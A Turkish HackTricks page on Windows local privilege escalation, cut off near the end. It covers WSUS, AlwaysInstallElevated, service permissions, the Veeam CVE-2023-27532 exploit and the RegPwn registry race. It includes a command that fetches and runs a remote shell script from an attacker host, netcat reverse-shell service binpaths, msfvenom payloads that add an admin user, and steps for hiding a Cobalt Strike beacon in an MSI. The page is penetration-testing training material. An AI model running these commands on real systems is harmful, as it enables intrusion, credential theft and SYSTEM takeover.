# Windows Yerel Ayrıcalık Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Başlangıç Windows Teorisi

### Access Tokens

**Windows Access Tokens'ın ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfayı kontrol edin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'taki integrity levels'ın ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okumalısınız:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Kontrolleri

Windows'ta sistem üzerinde keşif yapmanızı engelleyebilecek, yürütülebilir dosyaların çalışmasını önleyebilecek veya faaliyetlerinizi tespit edebilecek çeşitli mekanizmalar vardır. Privilege escalation keşfine başlamadan önce aşağıdaki sayfayı okuyup tüm bu savunma mekanizmalarını listelemelisiniz:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

RAiLaunchAdminProcess ile başlatılan UIAccess süreçleri, AppInfo secure-path kontrolleri atlatıldığında uyarı olmadan High IL'e erişmek için kötüye kullanılabilir. Özel UIAccess/Admin Protection bypass workflow'una bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation, rastgele bir SYSTEM registry yazması (RegPwn) için kötüye kullanılabilir:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## Sistem Bilgisi

### Versiyon bilgisi keşfi

Windows sürümünde bilinen bir zafiyet olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft security vulnerabilities hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanı 4.700'den fazla security vulnerabilities içerir ve Windows ortamının sunduğu **massive attack surface**'ı gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Sistem bilgisi ile yerelde**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Env variables içinde herhangi bir credential/Juicy info kayıtlı mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transkript dosyaları

Bunu nasıl açacağınızı şuradan öğrenebilirsiniz: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; yürütülen komutlar, komut çağrıları ve betiklerin parçaları dahil edilir. Ancak tam yürütme ayrıntıları ve çıktı sonuçları yakalanmayabilir.

Bunu etkinleştirmek için belgelendirmedeki "Transcript files" bölümündeki talimatları izleyin; **"Module Logging"**'i **"Powershell Transcription"** yerine tercih edin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell günlüklerinden son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Betik yürütmesinin tüm içeriği ve etkinlik kaydı eksiksiz şekilde yakalanır; bu, her kod bloğunun çalışırken belgelenmesini sağlar. Bu süreç, adli incelemeler ve kötü amaçlı davranışların analizleri için değerli olan her etkinliğin kapsamlı bir denetim izini korur. Tüm etkinlikler yürütme anında belgelenerek sürece dair ayrıntılı içgörüler sağlar.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için kayıt olayları Windows Event Viewer'da şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http**S** yerine http kullanılarak isteniyorsa sistemi ele geçirebilirsiniz.

Ağın SSL olmayan bir WSUS güncellemesi kullanıp kullanmadığını kontrol etmeye cmd'de aşağıdakini çalıştırarak başlarsınız:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdaki:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Eğer aşağıdakilerden biri gibi bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve eğer `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

O zaman, **it is exploitable.** Eğer son registry değeri `0` ise, WSUS girdisi yoksayılacaktır.

Bu zafiyetleri sömürmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Bunlar non-SSL WSUS trafiğine 'fake' güncellemeler enjekte eden MiTM weaponized exploit script'leridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temelde, bu hatanın yararlandığı zafiyet şudur:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla sömürebilirsiniz (serbest bırakıldığında).

## Üçüncü Taraf Otomatik Güncelleyiciler ve Agent IPC (local privesc)

Birçok kurumsal agent localhost üzerinde bir IPC yüzeyi ve ayrıcalıklı bir güncelleme kanalı açar. Eğer enrollment bir saldırgan sunucusuna zorlanabilirse ve updater sahte bir root CA'ya veya zayıf imzacı kontrollerine güvenirse, yerel bir kullanıcı SYSTEM servisi tarafından kurulacak kötü amaçlı bir MSI teslim edebilir. Genelleştirilmiş bir teknik (Netskope stAgentSvc zincirine dayalı – CVE-2025-0309) için bakın:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` localhost üzerinde **TCP/9401**'de saldırgan kontrollü mesajları işleyen bir servis açar; bu, **NT AUTHORITY\SYSTEM** olarak rastgele komutların çalıştırılmasına izin verir.

- **Recon**: dinleyiciyi ve versiyonu doğrulayın, örn. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: gerekli Veeam DLL'leri ile birlikte `VeeamHax.exe` gibi bir PoC'u aynı dizine yerleştirin, sonra yerel soket üzerinden bir SYSTEM payload tetikleyin:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Hizmet komutu SYSTEM olarak çalıştırır.

## KrbRelayUp

Windows **domain** ortamlarında belirli koşullar altında bir **local privilege escalation** zafiyeti mevcuttur. Bu koşullar arasında **LDAP signing is not enforced** olan ortamlar, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmasına izin veren self-rights'a sahip olmaları ve kullanıcıların domain içinde bilgisayar oluşturabilme yeteneği yer alır. Bu **gereksinimlerin** **varsayılan ayarlarla** karşılandığını not etmek önemlidir.

Exploit'i şurada bulabilirsiniz: [https://github.com/Dec0ne/KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)

Saldırının akışı hakkında daha fazla bilgi için şu kaynağı inceleyin: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Eğer** bu 2 kayıt **etkinleştirilmişse** (değer **0x1**), herhangi bir ayrıcalığa sahip kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Mevcut dizine, yetki yükseltmek amacıyla bir Windows MSI ikili dosyası oluşturmak için power-up'tan `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup eklemesi isteyen önceden derlenmiş bir MSI installer yazar (bu yüzden GIU erişimi gerekecek):
```
Write-UserAddMSI
```
Oluşturulan binary'i çalıştırarak yetki yükseltmesi yapın.

### MSI Wrapper

Bu öğreticiyi, bu araçları kullanarak bir MSI wrapper oluşturmayı öğrenmek için okuyun. Bir **.bat** dosyasını eğer sadece komut satırlarını çalıştırmak istiyorsanız sarmalayabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI Oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI Oluşturma

- **Oluşturun** with Cobalt Strike or Metasploit a **yeni Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- **Visual Studio**'yu açın, **Create a new project** seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
- Projeye bir isim verin, örneğin **AlwaysPrivesc**, konum için **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini işaretleyin ve **Create**'e tıklayın.
- Dosyaları seçme adımına gelene kadar **Next**'e tıklamaya devam edin (4 adımın 3'ü: choose files to include). **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'unu seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer** içinde **AlwaysPrivesc** projesini vurgulayın ve **Properties** içinde **TargetPlatform**'ı **x86**'dan **x64**'e değiştirin.
- Yüklenecek uygulamanın daha meşru görünmesini sağlayabilecek **Author** ve **Manufacturer** gibi değiştirebileceğiniz diğer özellikler de vardır.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'e sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, installer çalıştırılır çalıştırılmaz beacon payload'unun yürütülmesini sağlar.
- **Custom Action Properties** altında **Run64Bit**'i **True** olarak değiştirin.
- Son olarak, **derleyin**.
- Eğer `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı görünürse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötücül `.msi` dosyasının arka planda **kurulumunu** gerçekleştirmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu güvenlik açığını istismar etmek için kullanabileceğiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Dedektörler

### Denetim Ayarları

Bu ayarlar hangi bilgilerin **günlüğe kaydedildiğini** belirler, bu yüzden dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, logs'un nereye gönderildiğini bilmek ilginç.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, domain'e katılmış bilgisayarlarda **yerel Administrator parolalarının yönetimi** için tasarlanmıştır; her parolanın **benzersiz, rastgele oluşturulmuş ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli şekilde saklanır ve yalnızca ACLs aracılığıyla yeterli izin verilmiş kullanıcılar tarafından erişilebilir; yetkilendirildiklerinde yerel admin parolalarını görüntüleyebilirler.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Eğer etkinse, **düz metin parolalar LSASS içinde saklanır** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**'den başlayarak, Microsoft, Local Security Authority (LSA) için güvenilmeyen süreçlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engellemek** üzere gelişmiş koruma getirdi ve sistemi daha da güvenli hâle getirdi.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** Windows 10'da tanıtıldı. Amacı, cihazda saklanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, o kullanıcı için domain credentials genellikle oluşturulur.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar ve Gruuplar

### Kullanıcıları ve Grupları Listeleme

Ait olduğunuz grupların herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

Eğer **bazı ayrıcalıklı gruplara üyeyseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı gruplar ve bunları ayrıcalık yükseltmek için nasıl kötüye kullanabileceğiniz hakkında bilgi edinmek için buraya bakın:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Daha fazla bilgi** için bu sayfada bir **token**'ın ne olduğunu öğrenin: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Aşağıdaki sayfaya bakarak **ilginç token'ları** ve bunları nasıl kötüye kullanabileceğinizi öğrenin:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Ev klasörleri
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Panonun içeriğini al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan Süreçler

### Dosya ve Klasör İzinleri

Öncelikle, süreçleri listeleyip **süreçlerin komut satırlarında parola olup olmadığını kontrol edin**.\
Çalışan bazı binary'leri **overwrite some binary running** edip edemeyeceğinizi veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) istismar etmek için binary klasöründe yazma izninizin olup olmadığını kontrol edin:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman olası [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md) için kontrol edin.

**İşlem ikili dosyalarının izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Süreç binary'lerinin bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Çalışan bir sürecin bellek dökümünü sysinternals'tan **procdump** kullanarak oluşturabilirsiniz. FTP gibi servislerin belleğinde **credentials in clear text in memory** bulunur; belleği döküp bu credentials'ları okumayı deneyin.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM olarak çalışan uygulamalar bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## Servisler

Service Triggers, belirli koşullar oluştuğunda Windows'un bir service'i başlatmasına izin verir (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). SERVICE_START haklarına sahip olmasanız bile genellikle ayrıcalıklı servisleri tetikleyerek başlatabilirsiniz. Sayım ve etkinleştirme tekniklerini burada görebilirsiniz:

-
{{#ref}}
service-triggers.md
{{#endref}}

Servis listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir servisin bilgilerini almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her hizmet için gerekli ayrıcalık düzeyini kontrol etmek için _Sysinternals_'ten **accesschk** ikili dosyasına sahip olmanız önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" grubunun herhangi bir servisi değiştirme yetkisi olup olmadığını kontrol etmeniz önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Hizmeti etkinleştir

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; ya devre dışı bırakıldığı için ya da kendisiyle ilişkili etkin bir aygıt olmadığı için._

Bunu etkinleştirmek için şu komutu kullanabilirsiniz:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost servisinin çalışması için SSDPSRV'ye bağlı olduğunu unutmayın (XP SP1 için)**

**Bu sorunun bir diğer çözümü** çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Hizmet ikili dosya yolunu değiştir**

Bir serviste "Authenticated users" grubunun **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, servisin çalıştırılabilir ikili dosyası değiştirilebilir. Değiştirmek ve çalıştırmak için **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ayrıcalıklar çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servis ikili dosyasının yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar, bu da servis yapılandırmalarını değiştirme yeteneğine yol açar.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına izin verir.
- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yeteneğini sağlar.
- **GENERIC_ALL**: Servis yapılandırmalarını değiştirme yeteneğini sağlar.

Bu zafiyetin tespiti ve sömürülmesi için _exploit/windows/local/service_permissions_ kullanılabilir.

### Services binaries weak permissions

**Servis tarafından çalıştırılan ikili dosyayı değiştirebilip değiştiremeyeceğinizi** veya ikili dosyanın bulunduğu klasörde **yazma izinlerinizin** olup olmadığını kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir servis tarafından çalıştırılan tüm ikili dosyaları **wmic** (system32'de değil) ile alabilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Servis kayıt defteri değiştirme izinleri

Herhangi bir servis kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir servis **kayıt defteri** üzerindeki **izinlerinizi** **kontrol** etmek için:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE**'in `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Eğer sahiplerse, servis tarafından çalıştırılan binary değiştirilebilir.

Çalıştırılan binary'nin Path'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Some Windows Accessibility features create per-user **ATConfig** keys that are later copied by a **SYSTEM** process into an HKLM session key. A registry **symbolic link race** can redirect that privileged write into **any HKLM path**, giving an arbitrary HKLM **value write** primitive.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` yüklü erişilebilirlik özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` kullanıcı tarafından kontrol edilen yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` oturum açma/secure-desktop geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Sömürü akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** değerini doldurun.
2. AT broker akışını başlatan secure-desktop kopyasını tetikleyin (ör. **LockWorkstation**).
3. **Win the race** için `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerine bir **oplock** yerleştirin; oplock tetiklendiğinde, **HKLM Session ATConfig** anahtarını korumalı bir HKLM hedefini işaret eden bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilen HKLM yoluna yazar.

Rastgele HKLM **value write** elde ettikten sonra, hizmet yapılandırma değerlerini ezerek LPE'ye pivot yapın:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Bir normal kullanıcının başlatabileceği bir servisi seçin (ör. **`msiserver`**) ve yazmanın ardından tetikleyin. **Note:** kamuya açık exploit uygulaması yarışın bir parçası olarak **oturumu kilitler**.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Eğer bir registry üzerinde bu izne sahipseniz, bu **bu kayıttan alt registry'ler oluşturabileceğiniz** anlamına gelir. Windows services durumunda bu, **keyfi kod çalıştırmak için yeterlidir:**


{{#ref}}
